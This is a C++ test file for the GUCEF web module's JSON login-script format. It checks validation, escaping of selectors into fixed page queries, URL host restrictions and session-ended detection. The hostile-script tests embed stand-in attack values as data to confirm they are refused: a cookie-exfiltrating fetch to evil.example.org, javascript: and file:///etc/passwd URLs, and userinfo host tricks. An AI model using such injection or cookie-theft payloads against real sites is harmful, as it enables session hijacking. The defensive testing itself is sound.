/*
 *  gucefWEB_TestApp: GUCEF test application for the WEB module
 *
 *  Copyright (C) 1998 - 2026.  Dinand Vanvelzen
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */

/*-------------------------------------------------------------------------//
//                                                                         //
//      INCLUDES                                                           //
//                                                                         //
//-------------------------------------------------------------------------*/

#ifndef GUCEF_CORE_H
#include "gucefCORE.h"
#define GUCEF_CORE_H
#endif /* GUCEF_CORE_H ? */
#ifndef GUCEF_WEB_H
#include "gucefWEB.h"
#define GUCEF_WEB_H
#endif /* GUCEF_WEB_H ? */
#ifndef GUCEF_WEB_CWEBLOGINSCRIPT_H
#include "gucefWEB_CWebLoginScript.h"
#define GUCEF_WEB_CWEBLOGINSCRIPT_H
#endif /* GUCEF_WEB_CWEBLOGINSCRIPT_H ? */
#ifndef GUCEF_WEB_CWEBLOGINSCRIPTSTEP_H
#include "gucefWEB_CWebLoginScriptStep.h"
#define GUCEF_WEB_CWEBLOGINSCRIPTSTEP_H
#endif /* GUCEF_WEB_CWEBLOGINSCRIPTSTEP_H ? */
#ifndef GUCEF_WEB_CWEBLOGINSCRIPTCONDITION_H
#include "gucefWEB_CWebLoginScriptCondition.h"
#define GUCEF_WEB_CWEBLOGINSCRIPTCONDITION_H
#endif /* GUCEF_WEB_CWEBLOGINSCRIPTCONDITION_H ? */
#ifndef GUCEF_WEB_CWEBPAGESCRIPTHELPERS_H
#include "gucefWEB_CWebPageScriptHelpers.h"
#define GUCEF_WEB_CWEBPAGESCRIPTHELPERS_H
#endif /* GUCEF_WEB_CWEBPAGESCRIPTHELPERS_H ? */
#ifndef GUCEF_WEB_CWEBSIGNINBROWSERSETTINGS_H
#include "gucefWEB_CWebSignInBrowserSettings.h"
#define GUCEF_WEB_CWEBSIGNINBROWSERSETTINGS_H
#endif /* GUCEF_WEB_CWEBSIGNINBROWSERSETTINGS_H ? */
#ifndef GUCEF_WEB_CWEBSESSIONENDEDCHECK_H
#include "gucefWEB_CWebSessionEndedCheck.h"
#define GUCEF_WEB_CWEBSESSIONENDEDCHECK_H
#endif /* GUCEF_WEB_CWEBSESSIONENDEDCHECK_H ? */
#ifndef GUCEF_WEB_CHTTPRESPONSEDATA_H
#include "gucefWEB_CHttpResponseData.h"
#define GUCEF_WEB_CHTTPRESPONSEDATA_H
#endif /* GUCEF_WEB_CHTTPRESPONSEDATA_H ? */
#ifndef GUCEF_TEST_FRAMEWORK_H
#include "gucef_test_framework.h"
#define GUCEF_TEST_FRAMEWORK_H
#endif /* GUCEF_TEST_FRAMEWORK_H ? */

#include "TestWebLoginScript.h"

#define ERRORHERE       GUCEF_TESTFW_ERRORHERE
#define ASSERT_TRUE(t)  GUCEF_TESTFW_ASSERT_TRUE(t)
#define ASSERT_FALSE(t) GUCEF_TESTFW_ASSERT_FALSE(t)

/*-------------------------------------------------------------------------//
//                                                                         //
//      UTILITIES                                                          //
//                                                                         //
//-------------------------------------------------------------------------*/

using namespace GUCEF;
using namespace GUCEF::WEB;

namespace {

/** Loads a plugin from the directory of the test application, the debug or the release build of it */
bool
LoadPlugin( const CORE::CString& pluginName )
{
    #ifdef GUCEF_DEBUG_MODE
    CORE::CString firstPluginPath = "$MODULEDIR$/" + pluginName + "_d";
    CORE::CString secondPluginPath = "$MODULEDIR$/" + pluginName;
    #else
    CORE::CString firstPluginPath = "$MODULEDIR$/" + pluginName;
    CORE::CString secondPluginPath = "$MODULEDIR$/" + pluginName + "_d";
    #endif
    CORE::CPluginControl& pluginControl = CORE::CCoreGlobal::Instance()->GetPluginControl();
    if ( pluginControl.AddPluginFromDir( firstPluginPath, "test", true ) )
        return true;
    return pluginControl.AddPluginFromDir( secondPluginPath, "test", true );
}

/** A folder for the files of a test, below the working directory */
CORE::CString
TestDirectory( const CORE::CString& name )
{
    return CORE::CombinePath( CORE::CombinePath( CORE::RelativePath( "$CURWORKDIR$" ), "webtemp" ), name );
}

/** Whether the "json" codec the login scripts are read with is there, loading its plugin when it is not */
bool
JsonCodecAvailable( void )
{
    CORE::CDStoreCodecRegistry::TDStoreCodecPtr codec;
    if ( !CORE::CCoreGlobal::Instance()->GetDStoreCodecRegistry().TryLookup( "json", codec, false ) )
        LoadPlugin( "dstorepluginJSONPARSER" );
    return CORE::CCoreGlobal::Instance()->GetDStoreCodecRegistry().TryLookup( "json", codec, false );
}

/** Whether the problems hold a text */
bool
ProblemsMention( const CORE::CString::StringVector& problems, const char* text )
{
    for ( size_t i=0; i<problems.size(); ++i )
        if ( problems[ i ].HasSubstr( text, true ) >= 0 )
            return true;
    return false;
}

/** Loads the JSON text as a script; false and the problems when refused */
bool
LoadScript( const CORE::CString& json, CORE::CString::StringVector& problems )
{
    problems.clear();
    WEB::CWebLoginScript script;
    return script.LoadFromText( json, problems );
}

/** A valid script as JSON with the steps given (a JSON list of step objects) */
CORE::CString
ScriptJson( const CORE::CString& steps, const CORE::CString& extraTopLevel = CORE::CString::Empty )
{
    return "{ \"format\": \"gucef.webLoginScript\", \"version\": 1, \"name\": \"Example store\", "
           "\"startUrl\": \"https://shop.example.com/login\", \"cookieDomains\": [ \"shop.example.com\" ], "
           "\"allowedHosts\": [ \"accounts.example.com\" ], \"credentials\": [ \"username\", \"password\" ], "
           "\"signedIn\": { \"selector\": \"#account-menu\", \"cookie\": \"session_id\" }" + extraTopLevel + ", \"steps\": " + steps + " }";
}

}

/*-------------------------------------------------------------------------//
//                                                                         //
//      TESTS                                                              //
//                                                                         //
//-------------------------------------------------------------------------*/

static void
PerformLoginScriptTests( void )
{
    GUCEF_TESTFW_SUITE_SCOPE( "WebSignIn.LoginScript" );

    GUCEF_TESTFW_TESTCASE( "Test: A login script is read, validated, written and read again" )
        try
        {
            const CORE::CString json = ScriptJson(
                "[ { \"action\": \"open\", \"url\": \"https://accounts.example.com/signin\", \"comment\": \"the sign in service\" },"
                "  { \"action\": \"click\", \"selector\": \"#accept-cookies\", \"optional\": true, \"timeoutMs\": 3000 },"
                "  { \"action\": \"waitFor\", \"selector\": \"input[name=email]\", \"urlPattern\": \"https://accounts.example.com/*\" },"
                "  { \"action\": \"fill\", \"selector\": \"input[name=email]\", \"credential\": \"username\" },"
                "  { \"action\": \"fill\", \"selector\": \"input[name=password]\", \"credential\": \"password\" },"
                "  { \"action\": \"submit\", \"selector\": \"form#login\" },"
                "  { \"action\": \"failCheck\", \"text\": \"Wrong password\", \"reason\": \"The store refused the password\" },"
                "  { \"action\": \"personCheck\", \"kind\": \"captcha\", \"selector\": \"iframe[src*=captcha]\", \"prompt\": \"Solve the puzzle\" },"
                "  { \"action\": \"personCheck\", \"kind\": \"code\", \"selector\": \"input[name=code]\", \"prompt\": \"Type the code from your e-mail\" },"
                "  { \"action\": \"delay\", \"ms\": 500 },"
                "  { \"action\": \"waitForSignedIn\", \"timeoutMs\": 30000 } ]",
                ", \"sessionEnded\": { \"statusCodes\": [ 401, 403 ], \"redirectPattern\": \"https://shop.example.com/login*\" }, \"stepTimeoutMs\": 12000" );

            CORE::CString::StringVector problems;
            WEB::CWebLoginScript script;
            ASSERT_TRUE( script.LoadFromText( json, problems ) );
            ASSERT_TRUE( problems.empty() );
            ASSERT_TRUE( 1 == script.version && script.name == "Example store" && 11 == script.steps.size() );
            ASSERT_TRUE( 1 == script.cookieDomains.size() && 1 == script.allowedHosts.size() && 2 == script.credentialSlots.size() );
            ASSERT_TRUE( script.signedIn.selector == "#account-menu" && script.signedIn.cookie == "session_id" );
            ASSERT_TRUE( 2 == script.sessionEndedStatusCodes.size() && 403 == script.sessionEndedStatusCodes[ 1 ] );
            ASSERT_TRUE( 12000 == script.stepTimeoutInMs );
            if ( 11 == script.steps.size() )
            {
                ASSERT_TRUE( WEB::CWebLoginScriptStep::ACTION_OPEN == script.steps[ 0 ].action && script.steps[ 0 ].comment == "the sign in service" );
                ASSERT_TRUE( script.steps[ 1 ].optional && 3000 == script.steps[ 1 ].timeoutInMs && 3000 == script.GetStepTimeout( script.steps[ 1 ] ) );
                ASSERT_TRUE( 12000 == script.GetStepTimeout( script.steps[ 3 ] ) );
                ASSERT_TRUE( script.steps[ 2 ].condition.urlPattern == "https://accounts.example.com/*" );
                ASSERT_TRUE( script.steps[ 3 ].credential == "username" && script.steps[ 4 ].credential == "password" );
                ASSERT_TRUE( script.steps[ 7 ].kind == "captcha" && script.steps[ 7 ].prompt == "Solve the puzzle" );
                ASSERT_TRUE( 500 == script.steps[ 9 ].delayInMs );
            }
            ASSERT_TRUE( script.NeedsCredentials() );

            // written and read again: the same script
            CORE::CString written;
            ASSERT_TRUE( script.SaveToText( written ) );
            WEB::CWebLoginScript again;
            problems.clear();
            ASSERT_TRUE( again.LoadFromText( written, problems ) );
            ASSERT_TRUE( again.steps.size() == script.steps.size() && again.startUrl == script.startUrl );
            ASSERT_TRUE( again.sessionEndedRedirectPattern == script.sessionEndedRedirectPattern && 2 == again.sessionEndedStatusCodes.size() );
            ASSERT_TRUE( again.steps.size() > 7 && again.steps[ 7 ].condition.selector == "iframe[src*=captcha]" );

            // through a file
            CORE::CString path = TestDirectory( "websignin-scripts" );
            CORE::CreateDirs( path );
            CORE::AppendToPath( path, "login.json" );
            ASSERT_TRUE( script.SaveToFile( path ) );
            WEB::CWebLoginScript fromFile;
            problems.clear();
            ASSERT_TRUE( fromFile.LoadFromFile( path, problems ) );
            ASSERT_TRUE( fromFile.steps.size() == script.steps.size() );
            CORE::DeleteDir( TestDirectory( "websignin-scripts" ), true );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: Malformed login scripts are refused with a clear message" )
        try
        {
            CORE::CString::StringVector problems;
            const CORE::CString steps = "[ { \"action\": \"waitForSignedIn\" } ]";

            ASSERT_FALSE( LoadScript( "this is not { json", problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "not JSON" ) );
            ASSERT_FALSE( LoadScript( "", problems ) );

            // format and version
            ASSERT_FALSE( LoadScript( "{ \"version\": 1, \"name\": \"x\" }", problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'format'" ) );
            CORE::CString json = ScriptJson( steps );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "\"version\": 1", "\"version\": 2" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "version 2 is not supported" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "\"version\": 1,", "" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'version' is missing" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "\"version\": 1", "\"version\": \"1\"" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'version' must be a whole number" ) );

            // the domains and addresses
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "[ \"shop.example.com\" ]", "[ ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'cookieDomains' is missing" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "[ \"shop.example.com\" ]", "[ \"*.example.com\" ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "is not a host name" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "[ \"shop.example.com\" ]", "\"shop.example.com\"" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "must be a list" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "https://shop.example.com/login", "https://evil.example.org/login" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "not one of the cookie domains" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "https://shop.example.com/login", "javascript:alert(1)" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "must be an http or https address" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "https://shop.example.com/login", "file:///etc/passwd" ), problems ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "https://shop.example.com/login", "https://shop.example.com@evil.example.org/login" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "no user information" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( ", \"signedIn\": { \"selector\": \"#account-menu\", \"cookie\": \"session_id\" }", "" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'signedIn' is missing" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "\"cookie\": \"session_id\"", "\"cookie\": \"bad name;\"" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "not a valid cookie name" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "\"cookie\": \"session_id\"", "\"onload\": \"x\"" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "is not a key of a condition" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "[ \"username\", \"password\" ]", "[ \"username\", \"username\" ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "declared twice" ) );
            ASSERT_FALSE( LoadScript( json.ReplaceSubstr( "\"version\": 1", "\"version\": 1, \"stepTimeoutMs\": 600001" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'stepTimeoutMs' must be from 1" ) );

            // steps that are not right
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"fill\", \"selector\": \"#email\", \"credential\": \"email\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "is not declared in 'credentials'" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"fill\", \"selector\": \"#email\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'credential' is missing" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"click\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'selector' is missing" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"click\", \"selector\": 12 } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'selector' must be text" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"waitFor\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "a condition needs at least one" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"personCheck\", \"kind\": \"robot\", \"selector\": \"#x\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'kind' must be" ) && ProblemsMention( problems, "'prompt' is missing" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"delay\", \"ms\": 0 } ]" ), problems ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"delay\", \"ms\": 60000 } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'ms' must be from 1 to 10000" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"waitForSignedIn\", \"timeoutMs\": -5 } ]" ), problems ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"waitFor\", \"selector\": \"#x\", \"optional\": \"yes\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'optional' must be true or false" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"selector\": \"#x\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'action' is missing" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ \"open\" ]" ), problems ) );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: Hostile login scripts are refused: no code, no inline values, no other hosts" )
        try
        {
            CORE::CString::StringVector problems;

            // code in any form
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"eval\", \"expression\": \"fetch('https://evil.example.org/?'+document.cookie)\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'eval' is not an action" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"click\", \"selector\": \"#x\", \"javascript\": \"alert(1)\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'javascript' is not allowed: a script holds no code" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"waitForSignedIn\" } ]", ", \"script\": \"document.cookie\"" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'script' is not allowed" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"waitForSignedIn\" } ]", ", \"onLoad\": { \"run\": \"x\" }" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'onLoad' is not a key of a login script" ) );

            // values typed from the script itself
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"fill\", \"selector\": \"#password\", \"value\": \"hunter2\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "'value' is not allowed" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"fill\", \"selector\": \"#password\", \"credential\": \"password\", \"password\": \"hunter2\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "name a credential slot" ) );

            // a nested object where a step has text
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"click\", \"selector\": { \"a\": 1 } } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "must not be an object or a list" ) );

            // other hosts: an open step and an allowed host that are not the store's
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"open\", \"url\": \"https://evil.example.org/collect\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "goes to evil.example.org" ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"open\", \"url\": \"https://shop.example.com.evil.example.org/\" } ]" ), problems ) );
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"open\", \"url\": \"https://shop.example.com:99999/\" } ]" ), problems ) );

            // control characters and sizes
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"click\", \"selector\": \"#a\\n#b\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "control character" ) );
            CORE::CString longSelector = "#";
            for ( UInt32 i=0; i<600; ++i )
                longSelector += "a";
            ASSERT_FALSE( LoadScript( ScriptJson( "[ { \"action\": \"click\", \"selector\": \"" + longSelector + "\" } ]" ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "longer than 512 bytes" ) );
            CORE::CString manySteps = "[ ";
            for ( UInt32 i=0; i<70; ++i )
                manySteps += CORE::CString( 0 == i ? "" : ", " ) + "{ \"action\": \"delay\", \"ms\": 1 }";
            manySteps += " ]";
            ASSERT_FALSE( LoadScript( ScriptJson( manySteps ), problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "more than 64 steps" ) );
            CORE::CString huge = ScriptJson( "[ ]", ", \"comment\": \"" );
            while ( huge.ByteSize() < 70000 )
                huge += "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
            ASSERT_FALSE( LoadScript( huge, problems ) );
            ASSERT_TRUE( ProblemsMention( problems, "larger than 65536 bytes" ) );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: Selectors and texts go into the fixed page queries as escaped literals only" )
        try
        {
            ASSERT_TRUE( WEB::CWebPageScriptHelpers::JsStringLiteral( "#email" ) == "\"#email\"" );
            ASSERT_TRUE( WEB::CWebPageScriptHelpers::JsStringLiteral( "a\"b\\c" ) == "\"a\\\"b\\\\c\"" );
            ASSERT_TRUE( WEB::CWebPageScriptHelpers::JsStringLiteral( "line\nbreak\t\x01" ) == "\"line\\u000abreak\\u0009\\u0001\"" );
            ASSERT_TRUE( WEB::CWebPageScriptHelpers::JsStringLiteral( "sep\xE2\x80\xA8" "ara\xE2\x80\xA9" "tor" ) == "\"sep\\u2028ara\\u2029tor\"" );
            ASSERT_TRUE( WEB::CWebPageScriptHelpers::JsStringLiteral( "caf\xC3\xA9" ) == "\"caf\xC3\xA9\"" );

            // a selector that tries to end the literal stays inside it
            const CORE::CString hostile = "\"); fetch('https://evil.example.org/?'+document.cookie); (\"";
            const CORE::CString literal = WEB::CWebPageScriptHelpers::JsStringLiteral( hostile );
            ASSERT_TRUE( literal == "\"\\\"); fetch('https://evil.example.org/?'+document.cookie); (\\\"\"" );
            const CORE::CString expression = WEB::CWebPageScriptHelpers::ElementStateExpression( hostile );
            ASSERT_TRUE( expression.StartsWith( "(function(s){try{var e=document.querySelector(s);" ) );
            ASSERT_TRUE( expression.EndsWith( ")(" + literal + ")" ) );

            // every query is one function called with one literal
            ASSERT_TRUE( WEB::CWebPageScriptHelpers::ClickExpression( "#go" ).EndsWith( ")(\"#go\")" ) );
            ASSERT_TRUE( WEB::CWebPageScriptHelpers::SubmitExpression( "form" ).HasSubstr( "requestSubmit" ) > 0 );
            ASSERT_TRUE( WEB::CWebPageScriptHelpers::FocusAndClearExpression( "#password" ).EndsWith( ")(\"#password\")" ) );
            ASSERT_TRUE( WEB::CWebPageScriptHelpers::ContainsTextExpression( "it's" ).EndsWith( ")(\"it's\")" ) );
            ASSERT_TRUE( WEB::CWebPageScriptHelpers::ValueLengthExpression( "#x" ).HasSubstr( "value.length" ) > 0 );

            // patterns, hosts and domains
            ASSERT_TRUE( WEB::CWebLoginScriptCondition::MatchesPattern( "https://shop.example.com/account?x=1", "https://shop.example.com/account*" ) );
            ASSERT_TRUE( WEB::CWebLoginScriptCondition::MatchesPattern( "abc", "*" ) && WEB::CWebLoginScriptCondition::MatchesPattern( "", "*" ) );
            ASSERT_TRUE( WEB::CWebLoginScriptCondition::MatchesPattern( "https://a.example.com/x/login", "https://*.example.com/*/login" ) );
            ASSERT_FALSE( WEB::CWebLoginScriptCondition::MatchesPattern( "https://shop.example.com/login", "https://shop.example.com/account*" ) );
            ASSERT_FALSE( WEB::CWebLoginScriptCondition::MatchesPattern( "abc", "ab" ) );
            ASSERT_TRUE( WEB::CWebLoginScript::HostOfUrl( "HTTPS://Shop.Example.com:8443/login?x" ) == "shop.example.com" );
            ASSERT_TRUE( WEB::CWebLoginScript::HostOfUrl( "http://127.0.0.1:5000" ) == "127.0.0.1" );
            ASSERT_TRUE( WEB::CWebLoginScript::HostOfUrl( "https://a@b.example.com/" ).IsNULLOrEmpty() );
            ASSERT_TRUE( WEB::CWebLoginScript::HostOfUrl( "ftp://example.com/" ).IsNULLOrEmpty() );
            ASSERT_TRUE( WEB::CWebLoginScript::HostOfUrl( "https://[::1]/" ).IsNULLOrEmpty() );
            WEB::CWebLoginScript script;
            script.cookieDomains.push_back( "example.com" );
            script.allowedHosts.push_back( "login.other.test" );
            ASSERT_TRUE( script.IsUrlAllowed( "https://shop.example.com/" ) && script.IsUrlAllowed( "https://example.com/" ) );
            ASSERT_TRUE( script.IsUrlAllowed( "https://login.other.test/x" ) );
            ASSERT_FALSE( script.IsUrlAllowed( "https://badexample.com/" ) );
            ASSERT_FALSE( script.IsUrlAllowed( "https://other.test/" ) );
            ASSERT_TRUE( script.IsStoreCookieDomain( ".example.com" ) && script.IsStoreCookieDomain( "www.example.com" ) );
            ASSERT_FALSE( script.IsStoreCookieDomain( "login.other.test" ) );
            ASSERT_FALSE( WEB::CWebSignInBrowserSettings::IsArgumentAllowed( "--remote-debugging-address=0.0.0.0" ) );
            ASSERT_FALSE( WEB::CWebSignInBrowserSettings::IsArgumentAllowed( "--user-data-dir=/home" ) );
            ASSERT_FALSE( WEB::CWebSignInBrowserSettings::IsArgumentAllowed( "--remote-allow-origins=*" ) );
            ASSERT_TRUE( WEB::CWebSignInBrowserSettings::IsArgumentAllowed( "--disable-sync" ) );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END
}

/*-------------------------------------------------------------------------*/

static void
PerformSessionEndedCheckTests( void )
{
    GUCEF_TESTFW_SUITE_SCOPE( "WebSignIn.Session" );

    GUCEF_TESTFW_TESTCASE( "Test: The default check of an ended session: status codes and a redirect to the login page" )
        try
        {
            WEB::CWebSessionEndedCheck check;
            WEB::CHttpResponseData response;
            response.statusCode = 401;
            ASSERT_TRUE( check.IsSessionEnded( response ) );
            response.statusCode = 200;
            ASSERT_FALSE( check.IsSessionEnded( response ) );

            WEB::CWebLoginScript script;
            script.sessionEndedStatusCodes.push_back( 403 );
            script.sessionEndedRedirectPattern = "https://shop.example.com/login*";
            check.Configure( script );
            response.statusCode = 401;
            ASSERT_FALSE( check.IsSessionEnded( response ) );
            response.statusCode = 403;
            ASSERT_TRUE( check.IsSessionEnded( response ) );
            response.statusCode = 302;
            response.location = "https://shop.example.com/login?next=/library";
            ASSERT_TRUE( check.IsSessionEnded( response ) );
            response.location = "https://cdn.example.com/file.zip";
            ASSERT_FALSE( check.IsSessionEnded( response ) );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END
}

/*-------------------------------------------------------------------------*/

void
PerformWebLoginScriptTests( void )
{
    GUCEF_LOG( CORE::LOGLEVEL_NORMAL, "COMMENCING web login script TESTS" );

    // the scripts are JSON: read with the "json" codec of dstorepluginJSONPARSER
    if ( !JsonCodecAvailable() )
        GUCEF_WARNING_LOG( CORE::LOGLEVEL_IMPORTANT, "WebLoginScript tests: the json codec (dstorepluginJSONPARSER) is not loaded, reading scripts fails" );

    PerformLoginScriptTests();
    PerformSessionEndedCheckTests();

    GUCEF_LOG( CORE::LOGLEVEL_NORMAL, "ALL web login script TESTS COMPLETED" );
}

/*-------------------------------------------------------------------------*/
